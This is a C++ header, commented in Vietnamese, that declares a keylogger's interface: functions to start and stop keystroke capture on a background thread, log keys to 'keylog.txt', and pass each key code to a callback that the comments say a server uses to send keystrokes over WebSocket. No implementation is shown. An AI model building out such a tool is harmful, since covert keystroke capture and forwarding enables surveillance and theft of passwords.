#pragma once
#include <fstream>
#include <functional>
#include <atomic>
#include <thread> // Cần để chạy luồng riêng


// Callback: nhận mã phím (VK code) an toàn
using KeyEventCallback = std::function<void(int)>;

// Đăng ký callback (server sẽ dùng để gửi WS)
void setKeyEventCallback(KeyEventCallback cb);

/**
 * @brief Bắt đầu chạy keylogger trên một luồng riêng biệt.
 * Ghi log vào file "keylog.txt".
 */
void startKeylogger();

/**
 * @brief Dừng keylogger và dọn dẹp luồng.
 */
void stopKeylogger();

/**
 * @brief Kiểm tra xem keylogger có đang chạy hay không.
 * @return true nếu đang chạy, false nếu không.
 */
bool isKeyloggerRunning();